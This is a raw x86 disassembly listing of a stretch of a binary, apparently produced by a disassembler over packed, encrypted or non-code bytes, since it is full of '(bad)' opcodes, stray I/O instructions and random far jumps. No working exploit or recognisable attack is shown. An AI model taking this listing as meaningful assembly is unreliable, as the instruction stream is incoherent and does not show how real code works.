  40f4a1:	bound  ecx,QWORD PTR [ebx]
  40f4a3:	push   eax
  40f4a4:	push   esi
  40f4a5:	mov    ch,0x31
  40f4a7:	loopne 0x40f4e4
  40f4a9:	call   esi
  40f4ab:	xchg   esi,eax
  40f4ac:	(bad)  
  40f4ad:	mov    gs,WORD PTR [esi-0x3bb1928c]
  40f4b3:	lds    esi,FWORD PTR gs:[edx+0x1e]
  40f4b7:	enter  0x60b1,0xce
  40f4bb:	add    bl,bl
  40f4bd:	in     al,0x7a
  40f4bf:	mov    WORD PTR [ebx],gs
  40f4c1:	adc    ch,BYTE PTR [edx-0x36e4ad7c]
  40f4c7:	jmp    DWORD PTR [ecx-0x44]
  40f4ca:	aad    0xad
  40f4cc:	into   
  40f4cd:	gs and eax,0x85f4ac77
  40f4d3:	push   ebx
  40f4d4:	repnz adc esi,DWORD PTR [edi]
  40f4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d8:	in     eax,dx
  40f4d9:	les    esi,FWORD PTR [ebp-0x79988053]
  40f4df:	push   cs
  40f4e0:	jl     0x40f4eb
  40f4e2:	push   es
  40f4e3:	mov    WORD PTR [ecx-0x1],es
  40f4e6:	outs   dx,DWORD PTR ds:[esi]
  40f4e7:	sbb    BYTE PTR [esi+0x2fb3e6cb],ah
  40f4ed:	in     al,dx
  40f4ee:	xlat   BYTE PTR ds:[ebx]
  40f4ef:	sbb    edx,DWORD PTR ds:0xa0d832f8
  40f4f5:	mov    DWORD PTR [edx+0x4f8a0d58],esi
  40f4fb:	jge    0x40f54b
  40f4fd:	or     DWORD PTR [edx-0x25],0xe3722e05
  40f504:	add    al,0x6c
  40f506:	fstp   TBYTE PTR [esi]
  40f508:	inc    ecx
  40f509:	pop    edi
  40f50a:	push   esp
  40f50b:	shl    DWORD PTR [edx+0x13],0xbe
  40f50f:	retf   
  40f510:	lds    ebx,FWORD PTR [edi+0x610b4a29]
  40f516:	(bad)  
  40f517:	pop    DWORD PTR [edx]
  40f519:	jle    0x40f4ee
  40f51b:	retf   0x76b1
  40f51e:	popa   
  40f51f:	retf   
  40f520:	in     al,0x7b
  40f522:	push   edi
  40f523:	leave  
  40f524:	inc    eax
  40f525:	add    dh,dl
  40f527:	jmp    0xe47c8065
  40f52c:	addr16 push es
  40f52e:	shl    BYTE PTR [ebp+edx*2+0x1c],1
  40f532:	and    al,0x51
  40f534:	popa   
  40f535:	sbb    eax,0x129aea9
  40f53a:	jbe    0x40f556
  40f53c:	test   al,0x25
  40f53e:	addr16 lock jae 0x40f517
  40f542:	sbb    eax,DWORD PTR [edx+0x54]
  40f545:	dec    esi
  40f546:	xchg   edi,eax
  40f547:	rcl    BYTE PTR [edx-0x29271db7],1
  40f54d:	sub    esp,DWORD PTR [esp-0x5283d8d1]
  40f554:	mov    esp,0xb4e90f6c
  40f559:	xchg   ebx,eax
  40f55a:	das    
  40f55b:	sub    eax,0x3a001fdd
  40f560:	jg     0x40f5b8
  40f562:	xor    al,0x97
  40f564:	xor    ecx,esp
  40f566:	mov    eax,0x7aec1fab
  40f56b:	dec    edx
  40f56c:	popf   
  40f56d:	and    BYTE PTR [esi+0x452f4fe],ah
  40f573:	lods   al,BYTE PTR ds:[esi]
  40f574:	sbb    BYTE PTR [edx-0x1f],al
  40f577:	fdiv   DWORD PTR [esi+0x7b]
  40f57a:	inc    ebx
  40f57c:	cld    
  40f57d:	in     al,dx
  40f57e:	mov    es,edx
  40f580:	xor    BYTE PTR [ebx+ebx*4],al
  40f583:	xor    cl,BYTE PTR [edi+0x3d]
  40f586:	pushf  
  40f587:	xor    al,0x45
  40f589:	test   DWORD PTR [edx-0x39],ebx
  40f58c:	(bad)  
  40f58d:	fnstenv [edi-0x3c188b6f]
  40f593:	mov    ah,BYTE PTR [edi+0x15]
  40f596:	ss xor al,0x29
  40f599:	into   
  40f59a:	mov    ebp,0xabe644f7
  40f59f:	xchg   BYTE PTR [ecx],dh
  40f5a1:	test   al,0x87
  40f5a3:	push   cs
  40f5a4:	fwait
  40f5a5:	mov    dl,bl
  40f5a7:	pusha  
  40f5a8:	aad    0x7f
  40f5aa:	push   0x69dae3bd
  40f5af:	mov    ch,0xdd
  40f5b1:	xlat   BYTE PTR ds:[ebx]
  40f5b2:	pop    ebx
  40f5b3:	add    eax,0x85d8c74b
  40f5b8:	addr16 aam 0xdd
  40f5bb:	loop   0x40f574
  40f5bd:	popa   
  40f5be:	add    DWORD PTR [edi+0x1a],esi
  40f5c1:	test   BYTE PTR [esi+0x61],0x98
  40f5c5:	repz xchg ebp,eax
  40f5c7:	mov    ebp,0x4ee44f2b
  40f5cc:	mov    edi,0x7e752d4b
  40f5d1:	sub    bl,dl
  40f5d3:	pop    ebx
  40f5d4:	lds    ebp,FWORD PTR [ebp-0xc]
  40f5d7:	loopne 0x40f574
  40f5d9:	mov    ds:0x646c0880,al
  40f5de:	js     0x40f5e7
  40f5e0:	pusha  
  40f5e1:	stos   BYTE PTR es:[edi],al
  40f5e2:	(bad)  
  40f5e3:	xchg   esi,eax
  40f5e4:	cdq    
  40f5e5:	jb     0x40f5a2
  40f5e7:	out    0xc6,eax
  40f5e9:	cmc    
  40f5ea:	sub    al,0xb
  40f5ec:	inc    esi
  40f5ed:	xlat   BYTE PTR ds:[ebx]
  40f5ee:	jmp    0x3cbe:0x7249c30a
  40f5f5:	repnz adc al,ch
  40f5f8:	call   0x6bb00dce
  40f5fd:	dec    ax
  40f5ff:	and    esp,DWORD PTR [esi-0x67404d74]
  40f605:	test   al,0xd3
  40f607:	dec    edx
  40f608:	or     ebp,ecx
  40f60a:	frstor [ecx-0x1b]
  40f60d:	cmp    al,0xf7
  40f60f:	inc    ebx
  40f610:	fdiv   st(5),st
  40f612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f613:	stos   DWORD PTR es:[edi],eax
  40f614:	pop    edx
  40f615:	lods   eax,DWORD PTR ds:[esi]
  40f616:	adc    ebp,DWORD PTR [eax+ecx*4+0x5e49c1e0]
  40f61d:	mov    bl,0xa3
  40f61f:	pop    ss
  40f620:	outs   dx,BYTE PTR ds:[esi]
  40f621:	mov    ebp,0x386c699e
  40f626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f627:	loop   0x40f61f
  40f629:	mov    BYTE PTR [edx],bh
  40f62b:	fwait
  40f62c:	pusha  
  40f62d:	shr    DWORD PTR [esp+ebp*2+0x4f],0x9b
  40f632:	lock lods eax,DWORD PTR ds:[esi]
  40f634:	loope  0x40f5d9
  40f636:	jg     0x40f67c
  40f638:	fwait
  40f639:	inc    esp
  40f63a:	jp     0x40f63b
  40f63c:	pop    ebp
  40f63d:	push   edi
  40f63e:	test   ebp,esi
  40f640:	inc    ebp
  40f641:	cmc    
  40f642:	aaa    
  40f643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f644:	ret    0xb89d
  40f647:	cmp    DWORD PTR ds:0xf1f8a03d,esi
  40f64d:	ss adc al,0xcc
  40f650:	mov    al,cs:0x9aa5dd0a
  40f656:	cli    
  40f657:	push   eax
  40f658:	jae    0x40f673
  40f65a:	fwait
  40f65b:	sub    ecx,DWORD PTR [edi+0x6a]
  40f65e:	stc    
  40f65f:	sbb    edi,DWORD PTR [ebp+0x608c7495]
  40f665:	leave  
  40f666:	jbe    0x40f64e
  40f668:	nop
  40f669:	inc    eax
  40f66a:	and    DWORD PTR [ebp-0x556aa599],ecx
  40f670:	add    ebp,DWORD PTR [esi]
  40f672:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40f674:	dec    esp
  40f675:	xchg   BYTE PTR [ebx+0x269465d5],al
  40f67b:	jg     0x40f674
  40f67d:	mov    dh,0xb2
  40f67f:	jo     0x40f64a
  40f681:	or     al,0x6
  40f683:	xchg   edx,eax
  40f684:	or     BYTE PTR [ecx-0x2b],ch
  40f687:	mov    ds:0x7d07dc56,eax
  40f68c:	xor    eax,0x6095c402
  40f691:	add    al,BYTE PTR ds:[ebx]
  40f694:	test   bh,0xf6
  40f697:	fsubr  DWORD PTR [ebp-0x2e]
  40f69a:	push   cs
  40f69b:	popf   
  40f69c:	jecxz  0x40f6ee
  40f69e:	mov    esp,0x3c9ed0ef
  40f6a3:	jae    0x40f63b
  40f6a5:	xchg   edi,eax
  40f6a6:	call   0x976f:0xdc5bbce7
  40f6ad:	jns    0x40f6b0
  40f6af:	mov    eax,ds:0x5b05de91
  40f6b4:	dec    eax
  40f6b5:	pop    ebx
  40f6b6:	xor    al,0x6d
  40f6b8:	cmovge edx,ebx
  40f6bb:	stos   BYTE PTR es:[edi],al
  40f6bc:	scas   eax,DWORD PTR es:[edi]
  40f6bd:	ja     0x40f72f
  40f6bf:	stc    
  40f6c0:	mov    eax,0xcbb87887
  40f6c5:	jl     0x40f655
  40f6c7:	pop    esi
  40f6c8:	and    eax,0xd99e6170
  40f6cd:	out    dx,eax
  40f6ce:	in     eax,0x15
  40f6d0:	test   eax,0x3eb0d97a
  40f6d5:	lods   al,BYTE PTR ds:[esi]
  40f6d6:	xor    DWORD PTR ds:0x9b7adfe5,edx
  40f6dc:	mov    ds:0xca90da5f,eax
  40f6e1:	popa   
  40f6e2:	aas    
  40f6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6e4:	sbb    ecx,DWORD PTR [edi-0x50]
  40f6e7:	inc    ebp
  40f6e8:	xchg   ebx,eax
  40f6e9:	popf   
  40f6ea:	push   ds
  40f6eb:	xchg   cl,dh
  40f6ed:	adc    al,0xd7
  40f6ef:	lods   al,BYTE PTR ds:[esi]
  40f6f0:	sub    al,0x9f
  40f6f2:	mov    eax,ds:0x378a20c4
  40f6f7:	pop    edx
  40f6f8:	clc    
  40f6f9:	xchg   ebx,eax
  40f6fa:	aad    0xbf
  40f6fc:	test   eax,0x437e8552
  40f701:	sub    dh,BYTE PTR [ecx+0x5c506052]
  40f707:	mov    bh,0x6f
  40f709:	stos   BYTE PTR es:[edi],al
  40f70a:	dec    ebp
  40f70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70c:	imul   ebx,ebp,0x293cde22
  40f712:	add    BYTE PTR [edi-0x3f],al
  40f715:	adc    eax,0x1f5f7ab3
  40f71a:	addr16 and ecx,eax
  40f71d:	cdq    
  40f71e:	(bad)  
  40f720:	in     al,dx
  40f721:	ja     0x40f6fe
  40f723:	test   al,0x8c
  40f725:	xor    eax,0x4af01b79
  40f72a:	bound  di,DWORD PTR [esi-0xbca8d1c]
  40f731:	lock sbb BYTE PTR [edi],dh
  40f734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f735:	out    0x8e,eax
  40f737:	popf   
  40f738:	sbb    esp,DWORD PTR [edi]
  40f73a:	ja     0x40f710
  40f73c:	dec    ecx
  40f73d:	xchg   ebp,ebp
  40f73f:	mov    ah,0x48
  40f741:	push   esp
  40f742:	iret   
  40f743:	jbe    0x40f74f
  40f745:	mov    al,0xc7
  40f747:	sub    al,dh
  40f749:	cmp    eax,0x52a1c939
  40f74e:	into   
  40f74f:	jo     0x40f753
  40f751:	xor    al,dl
  40f753:	test   DWORD PTR [ebx-0x65],edx
  40f756:	mov    ch,0x1
  40f758:	das    
  40f759:	sub    dl,dh
  40f75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f75c:	lahf   
  40f75d:	ins    DWORD PTR es:[edi],dx
  40f75e:	es sub eax,0x4e882406
  40f764:	inc    edx
  40f765:	dec    ebx
  40f766:	mov    eax,ds:0x8a9f9381
  40f76b:	pop    es
  40f76c:	ror    BYTE PTR [ecx+0x6a],cl
  40f76f:	and    DWORD PTR [ebp+0x281586c],0x77eee18e
  40f779:	and    eax,0xc42aaaae
  40f77e:	arpl   cx,bx
  40f780:	into   
  40f781:	rcl    eax,cl
  40f783:	lahf   
  40f784:	adc    dl,0xc9
  40f787:	inc    ebx
  40f788:	scas   al,BYTE PTR es:[edi]
  40f789:	push   ecx
  40f78a:	jb     0x40f7db
  40f78c:	shl    DWORD PTR [esi+0x1],cl
  40f78f:	push   ss
  40f790:	in     al,0x2b
  40f792:	aad    0xa0
  40f794:	dec    ebx
  40f795:	add    DWORD PTR [edi+0x133687c4],edi
  40f79b:	add    ebp,esi
  40f79d:	sbb    edi,DWORD PTR [edx]
  40f79f:	popf   
  40f7a0:	(bad)  
  40f7a1:	(bad)  
  40f7a2:	cmp    eax,0xb775924d
  40f7a7:	dec    eax
  40f7a8:	(bad)  
  40f7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7aa:	jge    0x40f75c
  40f7ac:	sub    bl,BYTE PTR ds:0xb28ca917
  40f7b2:	fidivr WORD PTR [esi+0x56dad94e]
  40f7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b9:	pop    esi
  40f7ba:	aam    0x31
  40f7bc:	mov    al,0x44
  40f7be:	sub    al,BYTE PTR [ebx+0x2685b6ea]
  40f7c4:	jl     0x40f841
  40f7c6:	pop    ecx
  40f7c7:	adc    eax,0x8378c564
  40f7cc:	scas   eax,DWORD PTR es:[edi]
  40f7cd:	mov    BYTE PTR [esi],cl
  40f7cf:	mov    bl,0x94
  40f7d1:	push   0x5fc4db90
  40f7d6:	stos   BYTE PTR es:[edi],al
  40f7d7:	add    DWORD PTR [eax+0x5ed0a5f8],edi
  40f7dd:	dec    ecx
  40f7de:	cmp    DWORD PTR [ecx+0x5d],0x25
  40f7e2:	jne    0x40f83e
  40f7e4:	pop    ecx
  40f7e5:	add    bl,al
  40f7e7:	aas    
  40f7e8:	lea    esi,[esi+0x5a]
  40f7eb:	mov    ds:0xfca45fe,eax
  40f7f0:	test   BYTE PTR [eax],dl
  40f7f2:	shr    DWORD PTR [ebx],cl
  40f7f4:	pop    esi
  40f7f5:	mov    ch,0xd
  40f7f7:	push   0xd9133fa8
  40f7fc:	mov    cl,0x23
  40f7fe:	fbld   TBYTE PTR [edx+0x0]
  40f801:	(bad)  
  40f802:	bound  edx,QWORD PTR [ebx-0x696cbdee]
  40f808:	sahf   
  40f809:	hlt    
  40f80a:	jbe    0x40f7db
  40f80c:	inc    BYTE PTR [ecx+0x0]
  40f80f:	dec    ebx
  40f810:	ret    
  40f811:	mov    dl,0x15
  40f813:	lea    edx,[edi+eax*1]
  40f816:	mov    eax,ds:0xa64ff62b
  40f81b:	or     DWORD PTR [edx],ecx
  40f81d:	xor    BYTE PTR [bx+di-0x234d],0x5
  40f823:	std    
  40f824:	arpl   WORD PTR [edi-0x25],ax
  40f827:	(bad)  
  40f828:	cmp    BYTE PTR [ecx-0x11],dh
  40f82b:	iret   
  40f82c:	sub    ebx,0xd9ae5910
  40f832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f833:	xor    dl,bl
  40f835:	ss test al,0xb6
  40f838:	sbb    ecx,DWORD PTR [esi]
  40f83a:	sub    dl,BYTE PTR [ebp-0x4c]
  40f83d:	inc    edx
  40f83e:	cli    
  40f83f:	mov    al,0x5
  40f841:	xchg   edx,eax
  40f842:	mov    ch,0x20
  40f844:	sub    edx,DWORD PTR [eax-0x1a]
  40f847:	mov    ebx,0x268d2d47
  40f84c:	mov    dh,dl
  40f84e:	pusha  
  40f84f:	inc    edi
  40f850:	push   0x75408a64
  40f855:	mov    DWORD PTR [edi+esi*4+0x6a],edi
  40f859:	(bad)  
  40f85a:	jle    0x40f84b
  40f85c:	pop    eax
  40f85d:	mov    ebx,DWORD PTR [eax]
  40f85f:	adc    BYTE PTR [eax],dh
  40f861:	sub    ecx,DWORD PTR [ecx]
  40f863:	popa   
  40f864:	sahf   
  40f865:	(bad)  
  40f866:	or     ah,BYTE PTR [eax-0x37]
  40f869:	cdq    
  40f86a:	cmp    edi,edx
  40f86c:	shl    dh,cl
  40f86e:	pop    ebp
  40f86f:	cli    
  40f870:	addr16 xor ebp,ebx
  40f873:	cwde   
  40f874:	ja     0x40f893
  40f876:	loope  0x40f8ee
  40f878:	(bad)  
  40f879:	jmp    0xbab77086
  40f87e:	out    dx,al
  40f87f:	fcomi  st,st(3)
  40f881:	inc    ecx
  40f882:	inc    ebp
  40f883:	cmc    
  40f884:	sbb    ebx,0x5c
  40f887:	xchg   DWORD PTR [ecx-0x1c],ebx
  40f88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f88b:	jne    0x40f88e
  40f88d:	(bad)  
  40f88e:	xchg   edi,eax
  40f88f:	or     DWORD PTR [esi],ecx
  40f891:	ret    
  40f892:	adc    DWORD PTR [edi+ebx*2+0x76],0x540cafe3
  40f89a:	xchg   ebx,eax
  40f89b:	lods   al,BYTE PTR ds:[esi]
  40f89c:	mov    cl,0xd0
  40f89e:	or     al,0x52
  40f8a0:	cdq    
  40f8a1:	jns    0x40f8f4
  40f8a3:	inc    esi
  40f8a4:	(bad)  
  40f8a5:	adc    eax,0xf6b22e41
  40f8aa:	adc    esp,ebp
  40f8ac:	lods   eax,DWORD PTR ds:[esi]
  40f8ad:	cmp    eax,0x35ade2c2
  40f8b2:	sti    
  40f8b3:	popf   
  40f8b4:	popf   
  40f8b5:	call   0xc276bec1
  40f8ba:	mov    eax,0x3fe784b
  40f8bf:	lea    ecx,[ebx+0x6c]
  40f8c2:	dec    eax
  40f8c3:	adc    dl,BYTE PTR [ebx+ecx*2]
  40f8c6:	push   edi
  40f8c7:	pop    esp
  40f8c8:	add    bl,ah
  40f8ca:	inc    edi
  40f8cb:	or     al,0xba
  40f8cd:	sub    BYTE PTR [eax-0x5a],al
  40f8d0:	aad    0xe
  40f8d2:	mov    esp,0xfb761823
  40f8d7:	cdq    
  40f8d8:	push   eax
  40f8d9:	push   esi
  40f8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8db:	mov    ch,0xe3
  40f8dd:	cmp    DWORD PTR [edi+0x41c4e3ae],edx
  40f8e3:	out    dx,eax
  40f8e4:	mov    esp,0xad0c3b8b
  40f8e9:	shl    al,1
  40f8eb:	retf   0x2e01
  40f8ee:	movntq QWORD PTR [ebp-0x6c],mm5
  40f8f2:	mov    eax,0xe10e8b8d
  40f8f7:	sub    BYTE PTR [eax],ch
  40f8f9:	jnp    0x40f936
  40f8fb:	icebp  
  40f8fc:	je     0x40f908
  40f8fe:	add    BYTE PTR [ebp+0x2af8c58b],ch
  40f904:	sbb    eax,0xa52ab7d7
  40f909:	pop    ebp
  40f90a:	mov    eax,ds:0x18ca09
  40f90f:	mov    esi,0x841c659b
  40f914:	adc    edx,DWORD PTR [ecx+edx*1-0x79]
  40f918:	aam    0x13
  40f91a:	push   ss
  40f91b:	jns    0x40f95d
  40f91d:	mov    bh,al
  40f91f:	xchg   edi,ebp
  40f921:	sbb    DWORD PTR [edx],ebx
  40f923:	loopne 0x40f95a
  40f925:	mov    al,0xbb
  40f927:	xor    DWORD PTR [ebp+eiz*2+0xd],eax
  40f92b:	mov    dl,0x53
  40f92d:	jge    0x40f8da
  40f92f:	lods   al,BYTE PTR ds:[esi]
  40f930:	pop    ecx
  40f931:	xor    dh,BYTE PTR [ecx+0x4dc25f69]
  40f937:	les    eax,FWORD PTR [ecx+0x2a]
  40f93a:	lods   eax,DWORD PTR ds:[esi]
  40f93b:	enter  0xe08d,0xf6
  40f93f:	pop    ebp
  40f940:	pop    eax
  40f941:	arpl   WORD PTR [edi+0x1d0b56b2],dx
  40f947:	(bad)  
  40f948:	pop    ebx
  40f949:	sub    al,0xd4
  40f94b:	xor    eax,0x45afd1b
  40f950:	icebp  
  40f951:	pop    es
  40f952:	test   al,0x76
  40f954:	test   BYTE PTR [eax+eiz*2-0x3],cl
  40f958:	mov    edi,0xcd576d06
  40f95d:	mov    ds:0x2fcd82c5,al
  40f962:	(bad)  
  40f964:	and    bh,BYTE PTR [edi-0x3ca9bed6]
  40f96a:	mov    eax,ds:0x6fc69f76
  40f96f:	outs   dx,DWORD PTR ds:[esi]
  40f970:	sbb    eax,0x1fc09c70
  40f975:	jp     0x40f9a6
  40f977:	call   0x3e030b89
  40f97c:	sub    ecx,DWORD PTR [ecx]
  40f97e:	sub    eax,0x456fdb84
  40f983:	in     al,0x8f
  40f985:	mov    al,ds:0x672b6da9
  40f98a:	in     al,0x38
  40f98c:	pop    eax
  40f98d:	jmp    0x8a22:0x8bffbd2a
  40f994:	sub    BYTE PTR [esi+0x7157b286],dh
  40f99a:	fsubr  DWORD PTR [ebp-0x4a9b0b7]
  40f9a0:	test   BYTE PTR [esi],bl
  40f9a2:	cmp    ecx,DWORD PTR [esi-0x1f1c3225]
  40f9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a9:	mov    esi,DWORD PTR [edx-0x45ad6be3]
  40f9af:	popf   
  40f9b0:	and    bh,ah
  40f9b2:	dec    eax
  40f9b3:	aaa    
  40f9b4:	mov    ebp,0xfbe61d46
  40f9b9:	(bad)  
  40f9ba:	out    0x63,eax
  40f9bc:	mov    al,ds:0x972304fa
  40f9c1:	sbb    BYTE PTR [esi+0x5611927f],bh
  40f9c7:	cmp    eax,0xab7ef29
  40f9cc:	loope  0x40fa27
  40f9ce:	dec    ebx
  40f9cf:	enter  0xb9bc,0x9d
  40f9d3:	adc    eax,0xa7f05493
  40f9d8:	push   esi
  40f9d9:	das    
  40f9da:	inc    edx
  40f9db:	ret    0x8040
  40f9de:	mov    DWORD PTR [eax],eax
  40f9e0:	pushf  
  40f9e1:	sbb    al,BYTE PTR [esi-0x5d1ca202]
  40f9e7:	mov    ch,0x47
  40f9e9:	and    eax,0x621b7c67
  40f9ee:	pop    ebx
  40f9ef:	jb     0x40f996
  40f9f1:	gs push cs
  40f9f3:	stos   DWORD PTR es:[edi],eax
  40f9f4:	pop    ebx
  40f9f5:	adc    eax,0x218fb00e
  40f9fa:	sbb    ecx,DWORD PTR [ebp-0x57fe44ed]
  40fa00:	xor    DWORD PTR [ebp-0x6c54b8d7],esp
  40fa06:	dec    esp
  40fa07:	add    al,BYTE PTR [ebp-0x171e567e]
  40fa0d:	call   0x928a:0xb2df00f2
  40fa14:	mov    edx,0xe5d2b85e
  40fa19:	fisttp DWORD PTR [ebp-0x2a4b5c4]
  40fa1f:	xchg   esi,eax
  40fa20:	mov    ah,0x5e
  40fa22:	jns    0x40f9ee
  40fa24:	sub    BYTE PTR [ebp+0x47],bh
  40fa27:	jge    0x40f9d5
  40fa29:	pop    ecx
  40fa2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2b:	aaa    
  40fa2c:	push   0x4
  40fa2e:	jnp    0x40f9ec
  40fa30:	inc    ebp
  40fa31:	xchg   DWORD PTR [ebx],edx
  40fa33:	pop    eax
  40fa34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa35:	sbb    dl,BYTE PTR [ebp+0x14]
  40fa38:	push   eax
  40fa39:	dec    esi
  40fa3a:	mov    ds:0xa1f83559,al
  40fa3f:	pop    edi
  40fa40:	inc    ebp
  40fa41:	mov    esp,DWORD PTR [ebp+0x31f49c56]
  40fa47:	iret   
  40fa48:	retf   0xe3be
  40fa4b:	jp     0x40fa33
  40fa4d:	mov    ch,0x15
  40fa4f:	jbe    0x40fa3a
  40fa51:	(bad)  [edi]
  40fa53:	sub    eax,0xbfc88235
  40fa58:	int    0x9e
  40fa5a:	in     eax,0xda
  40fa5c:	pop    edi
  40fa5d:	adc    DWORD PTR [ebx],ebx
  40fa5f:	cmp    ch,bh
  40fa61:	(bad)  
  40fa62:	daa    
  40fa63:	push   esp
  40fa64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa65:	add    eax,0xd21783ed
  40fa6a:	pusha  
  40fa6b:	sub    BYTE PTR [ecx-0x1cf89090],bl
  40fa71:	inc    esi
  40fa72:	xchg   edi,eax
  40fa73:	enter  0xabd8,0xbf
  40fa77:	mov    ch,BYTE PTR [ebx+ecx*8-0x62]
  40fa7b:	retf   
  40fa7c:	je     0x40fa84
  40fa7e:	dec    ebp
  40fa7f:	sbb    cl,cl
  40fa81:	xchg   esp,eax
  40fa82:	xor    al,BYTE PTR [ecx]
  40fa84:	xor    eax,edx
  40fa86:	add    eax,0x1ea745be
  40fa8b:	mov    esp,0xf8cde7df
  40fa90:	xchg   esp,eax
  40fa91:	xor    DWORD PTR [eax-0x8],esi
  40fa94:	ja     0x40faef
  40fa96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa97:	push   ecx
  40fa98:	cli    
  40fa99:	ffreep st(7)
  40fa9b:	popa   
  40fa9c:	inc    ecx
  40fa9d:	inc    edx
  40fa9e:	das    
  40fa9f:	or     DWORD PTR [edx+0x4c3a9ace],0x586c6d4b
  40faa9:	push   ds
  40faaa:	out    dx,eax
  40faab:	das    
  40faac:	xor    al,0x41
  40faae:	adc    edx,ebp
  40fab0:	mov    al,ds:0xc491c7c5
  40fab5:	add    BYTE PTR [esi],0x92
  40fab8:	addr16 mov fs,eax
  40fabb:	jae    0x40fa3e
  40fabd:	iret   
  40fabe:	pop    ebx
  40fabf:	xchg   edi,eax
  40fac0:	push   edi
  40fac1:	add    BYTE PTR [ebx-0x6c559b68],ah
  40fac7:	cmc    
  40fac8:	xlat   BYTE PTR ds:[ebx]
  40fac9:	and    DWORD PTR [edi-0x14],0x3339f474
  40fad0:	xchg   edi,eax
  40fad1:	xchg   BYTE PTR [eax-0x14],bl
  40fad4:	scas   al,BYTE PTR es:[edi]
  40fad5:	push   ebx
  40fad6:	mov    ?,WORD PTR [ecx+ecx*2]
  40fad9:	loopne 0x40fa85
  40fadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fadc:	(bad)  
  40fadd:	sub    eax,0x5d909de0
  40fae2:	scas   al,BYTE PTR es:[edi]
  40fae3:	adc    eax,0x2caf4ff1
  40fae8:	dec    ebx
  40fae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faea:	mov    dh,0x3e
  40faec:	leave  
  40faed:	mov    dl,0x9f
  40faef:	std    
  40faf0:	fisubr DWORD PTR [ecx+0x32]
  40faf3:	mov    WORD PTR [ebx-0x6d],ds
  40faf6:	mov    edx,edi
  40faf8:	push   ebx
  40faf9:	fisttp WORD PTR [eax+esi*8]
  40fafc:	or     al,0xf6
  40fafe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faff:	mov    dl,0x43
  40fb01:	mov    esp,0x8bda7220
  40fb06:	jne    0x40fac5
  40fb08:	js     0x40fb6b
  40fb0a:	push   ebx
  40fb0b:	sbb    BYTE PTR ds:0x4e0c46f3,dh
  40fb11:	push   ss
  40fb12:	inc    edx
  40fb13:	(bad)  
  40fb14:	fcmovne st,st(1)
  40fb16:	and    al,0xa
  40fb18:	mov    bh,0xc3
  40fb1a:	lahf   
  40fb1b:	add    al,0x61
  40fb1d:	scas   eax,DWORD PTR es:[edi]
  40fb1e:	les    edi,FWORD PTR [eax+eiz*8-0x7c745107]
  40fb25:	pop    ecx
  40fb26:	shl    DWORD PTR [ebx+0x19e2f456],1
  40fb2c:	dec    DWORD PTR [edx]
  40fb2e:	adc    ebp,DWORD PTR [edx+ebp*8+0x61c78692]
  40fb35:	popa   
  40fb36:	dec    edi
  40fb37:	cwde   
  40fb38:	(bad)  
  40fb39:	scas   eax,DWORD PTR es:[edi]
  40fb3a:	sbb    al,0x7a
  40fb3c:	adc    BYTE PTR [eax],0x69
  40fb3f:	mov    cl,0x52
  40fb41:	(bad)  
  40fb43:	jae    0x40fb98
  40fb45:	xlat   BYTE PTR ds:[ebx]
  40fb46:	rol    esp,0xf4
  40fb49:	leave  
  40fb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb4b:	fld    TBYTE PTR [eax]
  40fb4d:	fidivr WORD PTR [edx+0x5cb2b5c]
  40fb53:	mov    ecx,DWORD PTR [edi-0x28]
  40fb56:	jns    0x40fb15
  40fb58:	mov    al,0x80
  40fb5a:	in     al,0x41
  40fb5c:	cmp    edx,DWORD PTR [edx]
  40fb5e:	lods   al,BYTE PTR ds:[esi]
  40fb5f:	nop    DWORD PTR [edi-0x60bf394c]
  40fb66:	daa    
  40fb67:	push   es
  40fb68:	mov    ds:0x9fefd020,eax
  40fb6d:	mov    ch,0xc7
  40fb6f:	push   ebp
  40fb70:	cmp    DWORD PTR [edi-0x2f],esi
  40fb73:	fucomip st,st(3)
  40fb75:	pushf  
  40fb76:	pop    es
  40fb77:	rep outs dx,DWORD PTR ds:[esi]
  40fb79:	popa   
  40fb7a:	or     al,cl
  40fb7c:	popa   
  40fb7d:	push   ebp
  40fb7e:	leave  
  40fb7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb80:	sti    
  40fb81:	imul   esp,DWORD PTR [di+0x256f],0xfffffff9
  40fb87:	cmp    BYTE PTR [ebp+0x7e],dh
  40fb8a:	mov    bh,0xcd
  40fb8c:	xchg   ecx,eax
  40fb8d:	mov    cl,dh
  40fb8f:	pop    ecx
  40fb90:	mov    al,ds:0x39b53e03
  40fb95:	push   ebx
  40fb96:	xor    BYTE PTR [ebx+0x57],0x26
  40fb9a:	jne    0x40fbc0
  40fb9c:	das    
  40fb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb9e:	add    ebx,edi
  40fba0:	shl    BYTE PTR [edx-0x7b],0x52
  40fba4:	rcl    DWORD PTR [ebx-0xe],cl
  40fba7:	loope  0x40fb8b
  40fba9:	add    BYTE PTR [eax-0x61],0xe2
  40fbad:	out    0x57,eax
  40fbaf:	cmp    eax,0x711994d9
  40fbb4:	and    al,ch
  40fbb6:	add    bh,dl
  40fbb8:	mul    BYTE PTR [edi-0x2998851f]
